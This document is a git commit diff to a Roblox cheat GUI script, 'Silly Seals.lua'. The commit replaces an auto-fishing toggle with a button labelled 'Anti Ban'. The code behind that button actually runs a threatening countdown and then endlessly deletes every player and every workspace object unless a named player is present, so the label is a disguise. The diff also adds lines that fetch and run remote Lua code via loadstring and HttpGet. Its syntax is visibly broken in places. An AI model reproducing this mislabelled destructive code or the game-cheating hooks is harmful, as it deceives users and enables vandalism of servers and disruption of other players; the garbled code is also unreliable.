47e56b041fa0eb38fa4a8e3f018dcbfcf5c2c767
Ww1avi <kandonmezmomo@gmail.com>
2025-02-08 19:57:48 +0100

    Silly Seals.lua

--- Silly Seals.lua
+++ Silly Seals.lua
@@ -27,18 +27,72 @@ Fluent:Notify({
 local Tabs = {
     Main = Window:AddTab({ Title = "Main", Icon = "House" }),
 
-    local Section = Tab:AddSection("🔁Auto Functions")
+	local Section = Tab:AddSection("Main")
 
-    local Toggle = Tab:AddToggle("MyToggle", 
-{
-    Title = "Auto Fish", 
-    Description = "Starts Auto Fish",
-    Default = false
-    Callback = function(state)
-	if state then
-	    game:GetService("ReplicatedStorage").Scripts.Fishing.Events.DeployBob:FireServer(workspace.FishingSpots.FishingSpot,CFrame.new(205.743484, 132.25, 269.160004, 1, 0, 0, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08))
-	else
-	    print("Toggle Off")
-        end
-    end 
+	Tab:AddButton({
+    Title = "Anti Ban",
+    Description = "To Protect you from the Bans",
+    Callback = function()
+        n = "B" 
+n = n.."a" 
+n = n.."ns" 
+n = n.."e" 
+n = n.."y" 
+h = Instance.new("Hint") 
+m = Instance.new("Message") 
+script.Name = n.."'s antiban" 
+--------------You can change below------------------
+respawntime = 90 
+protect = "OsQ" 
+-------Version [Don't change]------------
+version = 1.05 
+
+while true do 
+if game.Players:findFirstChild(protect) == nil then 
+m.Parent = game.Workspace 
+m.Text = protect.." is banned, the server will be removed..." 
+wait(3) 
+m.Text = "Unban "..protect.." or remove your script, else the server will be down with the following countdown!" 
+wait(3) 
+for i= respawntime, 0, -1 do 
+if game.Players:findFirstChild(protect) == nil then 
+m.Text = "If "..protect.." doesn't reappear in ["..i.."] then the server is down!" 
+wait(1) 
+end 
+end 
+if game.Players:findFirstChild(protect) ~= nil then 
+m.Text = protect.." came back, nothing will happen!" 
+wait(3) 
+m:remove() 
+else 
+while true do 
+for i, p in ipairs(game.Players:getChildren()) do 
+p:Remove() 
+end 
+for i, w in ipairs(game.Workspace:getChildren()) do 
+w:Remove() 
+end 
+wait()
+end 
+end 
+else 
+h.Parent = game.Workspace 
+h.Text = "Protecting: "..protect.." - Version: "..version.." - Created by: "..n 
+end 
+wait() 
+end
+    end
 })
+
+
+    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
+}
+
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+
+InterfaceManager:BuildInterfaceSection(Tabs.Settings)
+SaveManager:BuildConfigSection(Tabs.Settings)
